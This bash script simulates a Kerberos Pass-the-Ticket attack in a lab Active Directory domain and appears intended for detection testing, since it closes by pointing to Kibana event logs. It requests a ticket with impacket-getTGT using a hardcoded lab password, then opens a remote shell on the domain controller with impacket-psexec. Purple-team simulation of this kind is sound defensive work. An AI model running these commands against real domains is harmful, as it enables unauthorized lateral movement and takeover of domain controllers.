#!/bin/bash
# Attack Simulation: Pass-the-Ticket
# MITRE ATT&CK: T1550.003
# Usage: ./pass_the_ticket.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="labadmin"
PASSWORD="Password123!"

echo "[*] Syncing time with DC..."
sudo ntpdate $DC_IP

echo "[*] Requesting TGT..."
cd /tmp && impacket-getTGT "${DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip $DC_IP

echo "[*] Using ticket for authentication..."
export KRB5CCNAME=/tmp/${USERNAME}.ccache
impacket-psexec dc01.lab.local -k -no-pass

echo "[*] Attack complete - check Kibana for Event ID 4768 with RC4 encryption"
